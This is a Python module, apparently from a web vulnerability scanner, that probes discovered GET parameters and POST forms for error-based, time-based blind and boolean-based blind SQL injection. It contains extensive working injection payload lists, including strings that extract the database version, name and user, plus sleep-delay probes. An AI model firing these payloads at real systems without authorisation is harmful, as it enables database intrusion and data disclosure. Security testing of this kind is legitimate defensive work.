"""SQL Injection detection module.

Tests error-based, time-based blind, and boolean-based blind SQL injection
against all discovered parameters.
"""

from __future__ import annotations

import re
import time
from difflib import SequenceMatcher
from statistics import mean, pstdev
from typing import Any, Callable
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("sqli")

# ── Payloads ────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))",
    "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)",
    "' OR updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- ",
    "' OR extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- ",
    "1' AND JSON_EXTRACT('{\"x\":1}', '$.x')=1-- ",
    "1' AND JSON_KEYS('{\"x\":1}') IS NOT NULL-- ",
    "1' AND JSON_LENGTH('[1,2,3]')=3-- ",
    "') OR ('1'='1'--",
    "admin') OR ('1'='1'-- ",
    "' OR EXISTS(SELECT 1)--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1\"#",
    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0-- ",
    "' OR (SELECT 1/0)-- ",
    "' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- ",
    "1' AND CAST((SELECT version()) AS SIGNED)=1-- ",
    "1')/**/OR/**/('1'='1",
    "' OR 1=1 LIMIT 1-- ",
    "' AND GTID_SUBSET(CONCAT(0x7e,@@version,0x7e),1337)-- ",
    "' OR 0x50=0x50-- ",
    "1' XOR(if(now()=sysdate(),1,0)) XOR 'Z",
    "' OR (SELECT ELT(1=1,1))=1-- ",
    "' OR DATALENGTH('a')=1-- ",
    "' OR CHAR_LENGTH('abc')=3-- ",
    "' OR (SELECT current_setting('server_version') IS NOT NULL)-- ",
    "' OR @@version LIKE '%'% -- ",
    "' OR 1337 IN (SELECT 1337)-- ",
]

ERROR_PAYLOADS_QUICK = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))",
    "' OR EXISTS(SELECT 1)--",
    "1' AND JSON_KEYS('{\"x\":1}') IS NOT NULL-- ",
    "' OR 0x50=0x50-- ",
    "' OR (SELECT ELT(1=1,1))=1-- ",
    "' OR DATALENGTH('a')=1-- ",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5),
    ("' OR pg_sleep(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("'; WAITFOR DELAY '00:00:05'--", 5),
    ("' OR SLEEP(3)--", 3),
    ("' OR pg_sleep(3)--", 3),
    ("'; WAITFOR DELAY '0:0:3'--", 3),
    ("' OR SLEEP(4)--", 4),
    ("' OR pg_sleep(4)--", 4),
    ("'; WAITFOR DELAY '0:0:4'--", 4),
    ("' OR SLEEP(7)--", 7),
    ("' OR pg_sleep(7)--", 7),
    ("'; WAITFOR DELAY '0:0:7'--", 7),
    ("' AND IF(1=1,SLEEP(5),0)--", 5),
    ("' AND IF(2>1,SLEEP(3),0)--", 3),
    ("' OR SLEEP(10/2)--", 5),
    ("' OR IFNULL(SLEEP(4),0)--", 4),
    ("' OR BENCHMARK(2000000,MD5(1))--", 3),
    ("' OR BENCHMARK(3000000,SHA1(1))--", 4),
    ("1' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", 5),
    ("1' OR (SELECT CASE WHEN (2>1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--", 3),
    ("1' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(4) END)--", 4),
    ("';WAITFOR DELAY '00:00:04'--", 4),
]

BOOLEAN_PAYLOADS = [
    ("' OR 1=1--", "' OR 1=2--"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1 OR 1=1--", "1 OR 1=2--"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("1') OR ('1'='1'-- ", "1') OR ('1'='2'-- "),
    ("' OR 'a'='a'--", "' OR 'a'='b'--"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("' OR LENGTH(USER())>0--", "' OR LENGTH(USER())<0--"),
    ("' OR ASCII(SUBSTR(USER(),1,1))>32--", "' OR ASCII(SUBSTR(USER(),1,1))<32--"),
    ("' AND ASCII(SUBSTRING(current_user,1,1))>32--", "' AND ASCII(SUBSTRING(current_user,1,1))<32--"),
    ("' OR EXISTS(SELECT 1)--", "' OR EXISTS(SELECT 0)--"),
    ("' OR (SELECT 42)=42--", "' OR (SELECT 42)=43--"),
    ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- ", "' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- "),
    ("' OR COALESCE(NULL,'a')='a'-- ", "' OR COALESCE(NULL,'a')='b'-- "),
    ("1 OR 2>1--", "1 OR 2<1--"),
    ("' OR 1 BETWEEN 1 AND 1--", "' OR 1 BETWEEN 2 AND 1--"),
    ("' OR 2 IN (1,2)--", "' OR 3 IN (1,2)--"),
    ("' OR 1 LIKE 1--", "' OR 1 LIKE 2--"),
    ("' OR CEILING(1.2)=2--", "' OR CEILING(1.2)=1--"),
    ("' OR FLOOR(1.8)=1--", "' OR FLOOR(1.8)=2--"),
    ("' OR MOD(7,2)=1--", "' OR MOD(7,2)=0--"),
    ("' OR LOWER('A')='a'--", "' OR LOWER('A')='b'--"),
    ("' OR UPPER('a')='A'--", "' OR UPPER('a')='B'--"),
    ("' OR 0x41=CHAR(65)--", "' OR 0x41=CHAR(66)--"),
    ("' OR CAST(1 AS SIGNED)=1--", "' OR CAST(1 AS SIGNED)=2--"),
    ("' OR ABS(-1)=1--", "' OR ABS(-1)=2--"),
]

BOOLEAN_PAYLOADS_QUICK = [
    ("' OR 1=1--", "' OR 1=2--"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1 OR 1=1--", "1 OR 1=2--"),
    ("' OR EXISTS(SELECT 1)--", "' OR EXISTS(SELECT 0)--"),
    ("' OR 1 LIKE 1--", "' OR 1 LIKE 2--"),
    ("' OR CEILING(1.2)=2--", "' OR CEILING(1.2)=1--"),
    ("' OR MOD(7,2)=1--", "' OR MOD(7,2)=0--"),
]

# Database error patterns
_DB_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning:.*mysql", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"Microsoft OLE DB Provider", re.I),
    re.compile(r"ODBC SQL Server Driver", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"SQLite3::query", re.I),
    re.compile(r"pg_query\(\):", re.I),
    re.compile(r"supplied argument is not a valid MySQL", re.I),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Return *url* with *param* replaced by *payload*."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_error_based(
    client: httpx.Client,
    url: str,
    param: str,
    quick: bool = False,
) -> dict[str, Any] | None:
    payloads = ERROR_PAYLOADS_QUICK if quick else ERROR_PAYLOADS
    for payload in payloads:
        target = _inject_param(url, param, payload)
        try:
            resp = client.get(target)
        except httpx.HTTPError:
            continue
        for pat in _DB_ERROR_PATTERNS:
            match = pat.search(resp.text)
            if match:
                log.info("[SQLi] Error-based on %s param=%s payload=%s", url, param, payload)
                return {
                    "type": "error-based",
                    "parameter": param,
                    "payload": payload,
                    "evidence": match.group(0)[:200],
                    "url": url,
                }
    return None


def _measure_baseline_latency(
    client: httpx.Client,
    url: str,
    samples: int = 3,
) -> tuple[float, float]:
    timings: list[float] = []
    for _ in range(samples):
        start = time.monotonic()
        client.get(url)
        timings.append(time.monotonic() - start)
    if not timings:
        return 0.0, 0.0
    return mean(timings), pstdev(timings)


def _check_time_based(
    client: httpx.Client,
    url: str,
    param: str,
) -> dict[str, Any] | None:
    try:
        base_mean, base_stdev = _measure_baseline_latency(client, url)
    except httpx.HTTPError:
        base_mean, base_stdev = 0.0, 0.0

    for payload, delay in TIME_PAYLOADS:
        target = _inject_param(url, param, payload)
        try:
            start = time.monotonic()
            client.get(target)
            elapsed = time.monotonic() - start
        except httpx.HTTPError:
            continue

        threshold = base_mean + max(2.5, (3 * base_stdev))
        if elapsed >= threshold and elapsed >= (base_mean + max(delay - 1.0, 2.5)):
            log.info("[SQLi] Time-based on %s param=%s (%.1fs)", url, param, elapsed)
            return {
                "type": "time-based blind",
                "parameter": param,
                "payload": payload,
                "evidence": (
                    f"Response delayed {elapsed:.1f}s "
                    f"(baseline {base_mean:.2f}s ± {base_stdev:.2f}s, threshold {threshold:.2f}s)"
                ),
                "url": url,
            }
    return None


def _check_boolean_based(
    client: httpx.Client,
    url: str,
    param: str,
    quick: bool = False,
) -> dict[str, Any] | None:
    try:
        baseline = client.get(url)
    except httpx.HTTPError:
        return None

    baseline_text = baseline.text
    baseline_len = len(baseline_text)

    payload_pairs = BOOLEAN_PAYLOADS_QUICK if quick else BOOLEAN_PAYLOADS
    for true_payload, false_payload in payload_pairs:
        try:
            resp_true = client.get(_inject_param(url, param, true_payload))
            resp_false = client.get(_inject_param(url, param, false_payload))
        except httpx.HTTPError:
            continue

        if resp_true.status_code != resp_false.status_code or resp_true.status_code != baseline.status_code:
            continue

        true_text = resp_true.text
        false_text = resp_false.text
        len_diff = abs(len(true_text) - len(false_text))
        relative_threshold = max(120, int(baseline_len * 0.08))
        if len_diff < relative_threshold:
            continue

        sim_true = SequenceMatcher(None, baseline_text, true_text).ratio()
        sim_false = SequenceMatcher(None, baseline_text, false_text).ratio()
        if sim_true > sim_false + 0.03:
            log.info("[SQLi] Boolean-based on %s param=%s", url, param)
            return {
                "type": "boolean-based blind",
                "parameter": param,
                "payload": true_payload,
                "evidence": (
                    f"Length diff: {len_diff} bytes; baseline similarity "
                    f"true={sim_true:.3f}, false={sim_false:.3f}"
                ),
                "url": url,
            }
    return None


def test_sqli(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    timeout: float = 15.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict[str, Any]]:
    """Run SQL injection tests against all discovered endpoints and forms.

    When *quick* is True, skip time-based blind tests and limit POST form testing.
    Returns a list of confirmed finding dicts.
    """
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()  # (endpoint_path, param) dedup
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    with httpx.Client(
        verify=False, timeout=timeout, follow_redirects=True, headers=headers
    ) as client:
        # ── GET parameters ──────────────────────────────────────────
        for url in endpoints:
            if should_stop and should_stop():
                log.info("SQLi scan cancelled during GET parameter tests")
                break
            params = parse_qs(urlparse(url).query)
            path = urlparse(url).path
            for param in params:
                if should_stop and should_stop():
                    log.info("SQLi scan cancelled while testing %s", path)
                    break
                sig = (path, param)
                if sig in seen:
                    continue
                result = _check_error_based(client, url, param, quick=quick)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)
                    continue
                if not quick:
                    result = _check_time_based(client, url, param)
                    if result:
                        findings.append(_to_finding(result))
                        seen.add(sig)
                        continue
                result = _check_boolean_based(client, url, param, quick=quick)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)

        # ── POST form parameters ────────────────────────────────────
        max_forms = 10 if quick else len(forms)
        post_forms = [f for f in forms if f["method"] == "POST"][:max_forms]
        for form in post_forms:
            if should_stop and should_stop():
                log.info("SQLi scan cancelled during form tests")
                break
            action = form["action"]
            action_path = urlparse(action).path
            for inp in form["inputs"]:
                if should_stop and should_stop():
                    log.info("SQLi form testing cancelled on %s", action_path)
                    break
                name = inp["name"]
                if not name:
                    continue
                post_sig = (action_path, name)
                if post_sig in seen:
                    continue
                for payload in ERROR_PAYLOADS[:3] if quick else ERROR_PAYLOADS:
                    if should_stop and should_stop():
                        break
                    data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
                    data[name] = payload
                    try:
                        resp = client.post(action, data=data)
                    except httpx.HTTPError:
                        continue
                    for pat in _DB_ERROR_PATTERNS:
                        match = pat.search(resp.text)
                        if match:
                            findings.append(_to_finding({
                                "type": "error-based",
                                "parameter": name,
                                "payload": payload,
                                "evidence": match.group(0)[:200],
                                "url": action,
                            }))
                            seen.add(post_sig)
                            break
                    else:
                        continue
                    break  # found for this parameter, skip remaining payloads

    log.info("SQLi scan complete — %d findings", len(findings))
    return findings


def _to_finding(raw: dict[str, Any]) -> dict[str, Any]:
    return {
        "title": f"SQL Injection ({raw['type']}) on {urlparse(raw['url']).path}",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "affected_url": raw["url"],
        "parameter": raw["parameter"],
        "payload": raw["payload"],
        "evidence": raw["evidence"],
        "remediation": "Use parameterized queries / prepared statements. "
                       "Never concatenate user input into SQL strings.",
        "owasp_category": "A05:2025 - Injection",
    }
